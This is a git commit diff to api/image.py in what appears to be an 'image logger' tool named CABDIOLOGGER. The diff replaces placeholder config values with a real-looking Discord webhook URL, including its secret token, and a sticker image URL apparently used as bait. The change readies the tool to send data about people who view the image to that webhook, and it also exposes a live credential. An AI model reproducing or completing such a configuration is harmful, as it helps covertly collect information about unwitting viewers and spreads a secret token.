fc38889721ef715dfaad638c96c06e8ea846a84e
SeanFr2023 <153015055+SeanFr2023@users.noreply.github.com>
2025-10-07 21:07:46 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "webhook adresiniz",
-    "image": "fotografin adresi", 
+    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
+    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
